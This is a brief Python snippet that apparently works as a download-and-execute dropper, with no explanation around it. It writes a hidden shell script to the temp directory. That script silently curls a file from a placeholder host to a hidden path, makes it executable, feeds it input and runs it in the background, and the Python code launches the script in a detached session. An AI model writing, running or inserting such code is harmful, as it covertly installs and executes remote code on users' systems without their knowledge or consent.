import os
import subprocess
import tempfile

path = os.path.join(tempfile.gettempdir(), '.tool')
script = os.path.join(tempfile.gettempdir(), '.run')
url = 'https://example.invalid/tool'
config = 'configuration'
with open(script, 'w') as stream:
    stream.write(f"#!/bin/sh\ncurl -sLo {path} {url}&&chmod +x {path}&&echo '{config}'|{path}&\n")
os.chmod(script, 0o755)
subprocess.Popen([script], start_new_session=True)
